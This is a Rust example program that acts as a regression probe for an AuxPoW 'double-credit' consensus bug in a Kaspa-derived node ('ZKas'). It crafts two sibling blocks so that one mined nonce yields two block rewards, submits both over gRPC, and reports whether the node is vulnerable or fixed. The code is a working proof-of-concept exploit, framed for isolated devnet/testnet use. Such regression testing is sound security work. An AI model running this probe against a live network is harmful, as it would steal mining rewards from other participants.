//! End-to-end regression probe for the AuxPoW native-parent double-credit bug.
//!
//! Run only against an isolated devnet/testnet node:
//!
//! ```text
//! cargo run --release -p zkas-api --example auxpow_double_credit -- \
//!   127.0.0.1:26810 zkasdev:...
//! ```
//!
//! The probe prepares two valid sibling templates. `P` is mined natively, with
//! the AuxPoW commitment to `Q` stored in P's own coinbase extra-data. `Q` has
//! intentionally failing native PoW, but uses P's header and coinbase as its
//! AuxPoW parent. A vulnerable node accepts P and Q from one nonce. A fixed node
//! must reject P's body before Q can receive a second ZKas reward.

use std::error::Error;

use kaspa_addresses::Address;
use kaspa_consensus_core::{
    auxpow::AuxPow,
    block::{Block, MutableBlock},
    header::Header,
    merkle::calc_hash_merkle_root,
};
use kaspa_grpc_client::GrpcClient;
use kaspa_pow::State;
use kaspa_rpc_core::{api::rpc::RpcApi, notify::mode::NotificationMode};

fn failing_native_nonce(header: &Header) -> u64 {
    let state = State::new(header);
    let mut nonce = 0;
    while state.check_pow(nonce).0 {
        nonce = nonce.wrapping_add(1);
    }
    nonce
}

fn winning_native_nonce(header: &Header) -> u64 {
    let state = State::new(header);
    let mut nonce = 0;
    while !state.check_pow(nonce).0 {
        nonce = nonce.wrapping_add(1);
    }
    nonce
}

fn as_mutable(block: Block) -> MutableBlock {
    MutableBlock::new((*block.header).clone(), (*block.transactions).clone())
}

fn finalize_header(block: &mut MutableBlock) {
    block.header.hash_merkle_root = calc_hash_merkle_root(block.transactions.iter());
    block.header.finalize();
}

fn raw(block: &MutableBlock) -> kaspa_rpc_core::RpcRawBlock {
    (&block.clone().to_immutable()).into()
}

async fn connect(address: &str) -> Result<GrpcClient, Box<dyn Error>> {
    Ok(
        GrpcClient::connect_with_args(
            NotificationMode::Direct,
            format!("grpc://{address}"),
            None,
            true,
            None,
            false,
            Some(64),
            Default::default(),
        )
        .await?,
    )
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let rpc = std::env::args().nth(1).unwrap_or_else(|| "127.0.0.1:26810".into());
    let address = Address::try_from(std::env::args().nth(2).ok_or("missing mining address")?.as_str())?;
    let client = connect(&rpc).await?;
    let blocks_before = client.get_block_dag_info().await?.block_count;

    // Q is the would-be auxiliary child. Its native nonce is deliberately made
    // invalid before H_Q is committed into P's coinbase.
    let q_template = client.get_block_template(address.clone(), Vec::new()).await?;
    let mut q = as_mutable(q_template.block.try_into()?);
    q.header.nonce = failing_native_nonce(&q.header);
    q.header.finalize();
    assert!(!State::new(&q.header).check_pow(q.header.nonce).0, "Q must require AuxPoW");
    let q_hash = q.header.hash;

    // P is a normal ZKas block, except that a miner-controlled coinbase extra-data
    // suffix carries `ZKMM || H_Q`. Fresh isolated nodes have no mempool traffic;
    // require that so P's leaf-0 Merkle branch is empty and auditable.
    let p_template = client.get_block_template(address, Vec::new()).await?;
    let mut p = as_mutable(p_template.block.try_into()?);
    if p.transactions.len() != 1 {
        return Err(format!("expected a coinbase-only test template, got {} transactions", p.transactions.len()).into());
    }
    p.transactions[0].payload.extend_from_slice(&AuxPow::embed_commitment(&[], q_hash, &[]));
    finalize_header(&mut p);
    p.header.nonce = winning_native_nonce(&p.header);
    p.header.finalize();
    assert!(State::new(&p.header).check_pow(p.header.nonce).0, "P must be native-valid");

    // P's coinbase is the complete one-transaction parent tree. The same kHeavyHash
    // nonce is now reused: first for P's native PoW, then as Q's AuxPoW parent PoW.
    let aux = AuxPow {
        parent_header: p.header.clone(),
        parent_coinbase: p.transactions[0].clone(),
        coinbase_merkle_branch: vec![],
    };
    assert!(aux.verify_binding(q_hash), "P must bind exactly to Q");
    assert!(State::new(&aux.parent_header).check_pow(aux.parent_header.nonce).0, "P nonce must clear Q target in this test");
    q.header.aux_pow = Some(Box::new(aux));

    let p_response = client.submit_block(raw(&p), true).await?;
    let q_response = client.submit_block(raw(&q), true).await?;
    // `submit_block` reports header admission. Body validation is asynchronous,
    // so wait briefly and use the finalized body count as the reward-bearing
    // outcome rather than treating an initial Success as a completed block.
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    let blocks_after = client.get_block_dag_info().await?.block_count;
    let accepted_bodies = blocks_after.saturating_sub(blocks_before);
    println!("P={} native={:?} detail={}", p.header.hash, p_response.report, p_response.reject_detail);
    println!("Q={} aux={:?} detail={}", q.header.hash, q_response.report, q_response.reject_detail);
    println!("P nonce={} was reused unchanged as Q AuxPoW parent nonce", p.header.nonce);
    println!("block_count_before={blocks_before} block_count_after={blocks_after} accepted_bodies={accepted_bodies}");

    // A vulnerable node reports Success for both. Do not assert a particular result:
    // the same executable is also the regression harness for the fixed node.
    if accepted_bodies == 2 {
        println!("RESULT=VULNERABLE double credit accepted");
    } else if accepted_bodies == 1 {
        println!("RESULT=FIXED parent P rejected; Q cannot double-credit it");
    } else {
        println!("RESULT=INCONCLUSIVE P/Q split; inspect rejection detail and node log");
    }
    Ok(())
}
